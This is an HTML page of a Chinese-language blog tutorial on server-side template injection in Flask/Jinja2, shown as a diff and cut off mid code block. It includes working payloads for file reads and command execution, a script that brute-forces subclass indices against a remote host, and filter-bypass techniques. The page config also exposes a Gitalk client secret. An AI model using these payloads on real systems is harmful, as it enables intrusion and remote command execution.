@@ -1,0 +1,852 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Latte">
+    
+    <title>
+        
+            服务器端模板注入 |
+        
+        Latte&#39;s
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/logo.svg">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/font/css/brands.min.css">
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"ohvy.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Latte's","author":"Latte","avatar":"/images/cat.svg","logo":"/images/logo.svg","favicon":"/images/logo.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","tools":"/tools","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Latte and Americano.","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/ohvy","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":"shiwwang@163.com"}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":true,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":false},"comment":{"enable":true,"use":"gitalk","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":"ohvy","github_admins":null,"repository":"gitalk","client_id":"Ov23liQm7PTQpK5JLa0h","client_secret":"ba0525d7d59a301a09ac76ed9299df6ceb9a42a5","proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2022,"word_count":false,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":false,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{"tools":[{"category":"聊天 AI"},{"name":"ChatGPT","link":"https://chat.openai.com/","description":"OpenAI 旗下 AI 聊天对话工具","image":"/images/tools/chatgpt.svg"},{"name":"Gemini","link":"https://gemini.google.com/app","description":"Google 旗下 AI 聊天对话工具","image":"/images/tools/gemini.svg"},{"category":"待开发"}]},"version":"4.1.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Latte&#39;s
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                
+                                首页
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                
+                                归档
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                
+                                标签
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                
+                                分类
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tools"
+                            >
+                                
+                                工具
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/"
+                    >首页</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives"
+                    >归档</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags"
+                    >标签</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories"
+                    >分类</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tools"
+                    >工具</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about"
+                    >关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        服务器端模板注入
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/cat.svg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Latte</span>
+                                
+                                    <span class="author-badge">Lv2</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2022-12-06 00:29:59</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Mon May 06 2024 20:28:19 GMT+0800">2024-05-06 20:28:19</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E6%B8%97%E9%80%8F%EF%BC%9A%E4%BB%8E0%E5%88%B01/">渗透：从0到1</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/web/">web</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">常见漏洞</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body">
+                    
+
+                    <h1 id="一、SSTI简介"><a href="#一、SSTI简介" class="headerlink" title="一、SSTI简介"></a>一、SSTI简介</h1><p>SSTI， 即 <strong>Server-Side Template Injection，服务器端模板注入</strong>。</p>
+<h2 id="1、SSTI产生原因"><a href="#1、SSTI产生原因" class="headerlink" title="1、SSTI产生原因"></a>1、SSTI产生原因</h2><p>在MVC框架中，用户的输入通过 View 接收，交给 Controller ，然后由 Controller 调用 Model 或者其他的 Controller 进行处理，最后再返回给View ，这样就最终显示在我们的面前了，那么这里的 <strong>View</strong> 中就会大量地用到一种叫做<strong>模板</strong>的技术。<br>绕过服务端接收了用户的恶意输入后，<strong>未经任何处理</strong>就将其作为web应用模板内容的一部分，而模板引擎在<strong>进行目标编译渲染</strong>的进程中，执行了用户恶意攻击者插入的可以破坏模板的语句，就会导致信息泄露、代码执行、GetShell等问题。</p>
+<blockquote>
+<p><strong>网站模板引擎:</strong><br>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。<br>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这就大大提升了开发效率，良好的设计也使得代码重用变得更加容易。</p>
+</blockquote>
+<blockquote>
+<p>现行的模板引擎有:<br>PHP 的     Smarty, Twig, Blade.<br>Java 的    JSP, FreeMareker, Velocity.<br>Python 的  Flask(Jinja2), django, tornado</p>
+</blockquote>
+<p>……</p>
+<p>简单来说，可以理解为利用模板引擎来生成前端的HTML代码。模板引擎会会提供一套生成HTML代码的程序，然后只需要获取用户的数据，将其放到渲染函数里，最后生成模板+用户数据的前端HTML页面，反馈给浏览器，从而呈现在用户面前。当这里的“用户的数据”具有恶意攻击性而又不被处理时，SSTI就发生了。</p>
+<h2 id="2、SSTI检测工具-Tplmap"><a href="#2、SSTI检测工具-Tplmap" class="headerlink" title="2、SSTI检测工具 Tplmap"></a>2、SSTI检测工具 Tplmap</h2><blockquote>
+<p>工具地址: <a class="link"   target="_blank" rel="noopener" href="https://github.com/epinna/tplmap" >https://github.com/epinna/tplmap<i class="fas fa-external-link-alt"></i></a><br>安装教程: <a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/ktsm/p/15691652.html" >https://www.cnblogs.com/ktsm/p/15691652.html<i class="fas fa-external-link-alt"></i></a><br>使用教程: <a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/EC_Carrot/article/details/109709767" >https://blog.csdn.net/EC_Carrot/article/details/109709767<i class="fas fa-external-link-alt"></i></a></p>
+</blockquote>
+<p>【参考资料：**<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/120205725" >详解SSTI模板注入<i class="fas fa-external-link-alt"></i></a>**】</p>
+<h1 id="二、SSTI-利用"><a href="#二、SSTI-利用" class="headerlink" title="二、SSTI 利用"></a>二、SSTI 利用</h1><blockquote>
+<p>以Flask（Jinja2）为例（windows），该版块仅涉及主机上的python语法</p>
+</blockquote>
+<h2 id="Ⅰ-基础知识"><a href="#Ⅰ-基础知识" class="headerlink" title="Ⅰ. 基础知识"></a>Ⅰ. 基础知识</h2><h3 id="1、Python-内建函数"><a href="#1、Python-内建函数" class="headerlink" title="1、Python 内建函数"></a>1、Python 内建函数</h3><p>启动 python 解释器时，即使没有创建任何变量或函数还是会有很多函数可供使用，这些就是 python 的内建函数。在 Python 交互模式下，使用命令 <code>dir(&#39;builtins&#39;)</code> 即可查看当前 Python 版本的一些内建变量、内建函数，<strong>内建函数可以调用一切函数</strong>。</p>
+<h3 id="2、Python-类继承"><a href="#2、Python-类继承" class="headerlink" title="2、Python 类继承"></a>2、Python 类继承</h3><p>Python 中一切皆为对象，均继承于 object 对象，Python 中的 object 类中集成了很多的基础函数，假如需要在 payload 中使用某个函数就需要用 object 去操作。</p>
+<p>常见的<strong>继承关系</strong>有以下三种：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. base ：对象的一个基类，一般是object</span><br><span class="line">2. mro  ：获取对象的基类，只是这时会显示整个继承链的关系，是一个列表，而object在最列表的最顶层，通过mro[-1]可以获取到</span><br><span class="line">3. subclasses() : 继承此对象的子类，返回一个列表</span><br></pre></td></tr></table></figure>
+
+<h2 id="Ⅱ-构造payload"><a href="#Ⅱ-构造payload" class="headerlink" title="Ⅱ. 构造payload"></a>Ⅱ. 构造payload</h2><br>
+
+<p><strong>攻击方式为：变量-&gt;对象-&gt;基类-&gt;子类遍历-&gt;全局变量</strong></p>
+<h3 id="1、相关属性"><a href="#1、相关属性" class="headerlink" title="1、相关属性"></a>1、相关属性</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">对于返回的是类实例：</span><br><span class="line">1. __class__            //返回实例的对象，可以使实例指向class，从而使用下面的魔术方法</span><br><span class="line">如：</span><br><span class="line">&gt;&gt;&gt;&#x27;&#x27;.__class__  </span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br><span class="line"></span><br><span class="line">对于返回的是定义的class类：</span><br><span class="line">2. __base__              //返回类的父亲 python3</span><br><span class="line">3. __mro__               //返回类继承的元组，即寻找父类 python3</span><br><span class="line">4. __subclasses__()      //返回类中仍然可用的引用，可以此获取想要的类的对象 python3</span><br><span class="line">如：</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[138]  </span><br><span class="line">&lt;class &#x27;os._wrap_close&#x27;&gt;   </span><br><span class="line">Tip：根据索引值来获取想用的可利用类,不加索引会输出全部存活的引用</span><br><span class="line"></span><br><span class="line">5. __builtins__          //作为默认初始模块出现，可用于查看当前所有导入的内建函数</span><br><span class="line">6. __globals__           //对包含函数全局变量的字典的引用。如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量 python3</span><br><span class="line">7. __init__              //返回类的初始化方法</span><br><span class="line">如：</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__subclasses__()[38].__init__</span><br><span class="line">&lt;slot wrapper &#x27;__init__&#x27; of &#x27;object&#x27; objects&gt;</span><br><span class="line">Tip: &#x27;wrapper&#x27;是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、一个简单的payload寻找过程"><a href="#2、一个简单的payload寻找过程" class="headerlink" title="2、一个简单的payload寻找过程"></a>2、一个简单的payload寻找过程</h3><h4 id="Ⅰ-找到-globals-全局"><a href="#Ⅰ-找到-globals-全局" class="headerlink" title="Ⅰ. 找到__globals__全局"></a>Ⅰ. 找到<code>__globals__</code>全局</h4><p>根据上述属性，找到重载过的 <code>__init__</code> 类（在获取初始化属性后，带 <code>wrapper</code> 的说明没有重载，因此寻找**<code>不带 warpper</code>** 的即可），并通过 <code>__globals__</code> 全局来查找所有的方法及变量及参数，或者获取 <code>file</code> 、 <code>os</code> 等模块以进行下一步的利用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__subclasses__()[138].__init__</span><br><span class="line">&lt;function _wrap_close.__init__ at 0x0000025AA50BAEE0&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Ⅱ-查看其引用-builtins"><a href="#Ⅱ-查看其引用-builtins" class="headerlink" title="Ⅱ. 查看其引用__builtins__"></a>Ⅱ. 查看其引用<code>__builtins__</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;]            </span><br><span class="line">Tip：这里会返回 dict 类型，寻找 keys 中可用函数，使用 keys 中的 file 等函数来实现读取文件的功能</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220915221230348-826204857.png"
+                       
+                 ></p>
+<h4 id="Ⅲ-使用可利用函数实现文件读取功能等"><a href="#Ⅲ-使用可利用函数实现文件读取功能等" class="headerlink" title="Ⅲ. 使用可利用函数实现文件读取功能等"></a>Ⅲ. 使用可利用函数实现文件读取功能等</h4><p><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;/etc/passwd&#39;).read() </code></p>
+<h3 id="3、常用的目标函数"><a href="#3、常用的目标函数" class="headerlink" title="3、常用的目标函数"></a>3、常用的目标函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file</span><br><span class="line">subprocess.Popen</span><br><span class="line">os.popen</span><br><span class="line">exec</span><br><span class="line">eval</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>几个含有<code>eval</code>函数的类：<br>warnings.catch_warnings<br>WarningMessage<br>codecs.IncrementalEncoder<br>codecs.IncrementalDecoder<br>codecs.StreamReaderWriter<br>os._wrap_close<br>reprlib.Repr<br>weakref.finalize<br>……</p>
+</blockquote>
+<h3 id="4、命令执行"><a href="#4、命令执行" class="headerlink" title="4、命令执行"></a>4、命令执行</h3><p>Python常用的三种<strong>命令执行</strong>方式：</p>
+<blockquote>
+<p><code>os.system()</code><br>该方法的参数就是 string 类型的命令，在 linux 上返回值为执行命令的 exit 值；而windows上返回值则是运行命令后 shell 的返回值；注意：该函数返回命令<strong>执行结果的返回值</strong>，并不是返回命令的执行输出（执行成功返回0，失败返回-1），因此需要配合 curl 外带数据查看回显          #这里画个问号 </p>
+</blockquote>
+<blockquote>
+<p><code>os.popen()</code><br>返回的是 file read 的对象，如果想获取执行命令的输出，则需要调用该对象的 read() 方法</p>
+</blockquote>
+<blockquote>
+<p>直接寻找 <code>os</code> 模块执行命令<br>先编写脚本遍历Python中含有os模块的类的索引号，然后选取其中一个构造payload执行命令，脚本如下：</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for i in range(500):</span><br><span class="line">    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125;&#125;&quot;</span><br><span class="line"></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    if &#x27;os.py&#x27; in res.text:</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>用例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</span><br><span class="line">Tip: 需要导入os模块</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)</span><br><span class="line">Tip: 需要导入os模块</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[79].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;dir&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到，即使是使用os模块执行命令，其也是调用的os模块中的popen函数，那我们也可以直接调用popen函数，存在popen函数的类一般是 <code>os._wrap_close</code>，但也不绝对。由于目标Python环境的不同，我们还需要遍历一下。<br><br></p>
+<blockquote>
+<p>事实上，在本地python环境下，可以直接在<code>os._wrap_close</code>找到popen函数：<br><code>&#39;&#39;.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#39;popen&#39;](&#39;dir&#39;).read()</code></p>
+</blockquote>
+<p>【参考资料：<a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9584#toc-17" >以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用<i class="fas fa-external-link-alt"></i></a>】</p>
+<h1 id="三、模板注入绕过"><a href="#三、模板注入绕过" class="headerlink" title="三、模板注入绕过"></a>三、模板注入绕过</h1><h2 id="1、语法"><a href="#1、语法" class="headerlink" title="1、语法"></a>1、语法</h2><p>官方文档对于模板的部分语法介绍如下（仍然以jinja2为例：<a class="link"   target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/2.11.x/templates/" >Template Designer Documentation<i class="fas fa-external-link-alt"></i></a>）</p>
+<blockquote>
+<p>1 基本语法</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ... %&#125; for Statements </span><br><span class="line">可用来声明变量，也可用以循环语句和条件语句</span><br><span class="line">&#123;&#123; ... &#125;&#125; for Expressions to print to the template output</span><br><span class="line">用于将表达式打印到模板输出</span><br><span class="line">&#123;# ... #&#125; for Comments not included in the template output</span><br><span class="line">表示未包含在模板输出中的注释</span><br><span class="line">#  ... # for Line Statements</span><br><span class="line">## 可以有和 &#123;%%&#125; 相同的效果</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>2 dot(.)的绕过</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You can use a dot (.) to access attributes of a variable in addition to the standard Python __getitem__ “subscript” syntax ([]). --官方原文</span><br><span class="line">可以用 . 或者 [] 来访问变量的属性，也就是说</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__&#125;&#125;  等价于  &#123;&#123;&quot;&quot;[&#x27;__classs__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>因此，当<code>.</code>被过滤时，我们可以使用<code>[]</code>以绕过。</p>
+<blockquote>
+<p>3 如果想调用字典中的键值，其本质其实是调用了魔术方法<code>__getitem__</code></p>
+</blockquote>
+<p>所以对于取<strong>字典中键值</strong>的情况不仅可以用<code>[]</code>，也可以用<code>__getitem__</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.__getitem__(&#x27;__builtins__&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>4 调用对象的方法，具体是调用了魔术方法<code>__getattribute__</code></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__</span><br><span class="line">&quot;&quot;.__getattribute__(&quot;__class__&quot;)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>5 <strong><code>lipsum</code></strong><br><strong>flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：</strong></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">#在CTF中很好用</span><br></pre></td></tr></table></figure>
+<p>【参考资料：<a class="link"   target="_blank" rel="noopener" href="https://lazzzaro.github.io/2020/05/15/web-SSTI/" >SSTI<i class="fas fa-external-link-alt"></i></a>】</p>
+<h2 id="2、绕过"><a href="#2、绕过" class="headerlink" title="2、绕过"></a>2、绕过</h2><h3 id="Ⅰ-字符串"><a href="#Ⅰ-字符串" class="headerlink" title="Ⅰ. 字符串"></a>Ⅰ. 字符串</h3><p>1、拼接<br><code>&quot;cla&quot;+&quot;ss&quot;</code></p>
+<p>2、反转<br><code>&quot;__ssalc__&quot;[::-1]</code></p>
+<p>3、编码绕过（ASCII码、Unicode编码等）<br>4、利用chr函数<br>因为我们没法直接使用chr函数，所以需要通过<code>__builtins__</code>找到他</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=url_for.__globals__[&#x27;__builtins__&#x27;].chr %&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125;&#125;  //%2b为 + ，拼接字符串</span><br><span class="line">==&gt;&#123;&#123;&quot;&quot;.__class__&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>5、在jinja2里面可以利用<code>~</code>进行拼接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set a=&#x27;__cla&#x27; %&#125;&#123;%set b=&#x27;ss__&#x27;%&#125;&#123;&#123;&quot;&quot;[a~b]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>6、大小写过滤转换</p>
+<h3 id="Ⅱ-过滤器"><a href="#Ⅱ-过滤器" class="headerlink" title="Ⅱ. 过滤器"></a>Ⅱ. 过滤器</h3><blockquote>
+<p>在模板中, 过滤器相当于一个函数, 把当前的变量传入到过滤器中, 然后过滤器根据自身功能, 再返回对应的值, 之后再把结果渲染到页面中<br>基本语法: <code>&#123;&#123; 变量 | 过滤器名称 &#125;&#125; </code>使用管道符号<code>|</code>进行组合，可以链接多个过滤器。一个过滤器的输出应用于下一个过滤器。</p>
+</blockquote>
+<p>常用的过滤器：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1. attr</span><br><span class="line">#用于获取变量，可用于. [] 都被过滤的情况</span><br><span class="line">&quot;&quot;|attr(&quot;__class__&quot;) &lt;==&gt; &quot;&quot;.__class__</span><br><span class="line">2. format</span><br><span class="line">#格式化字符串</span><br><span class="line">&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)  </span><br><span class="line">&lt;==&gt;  </span><br><span 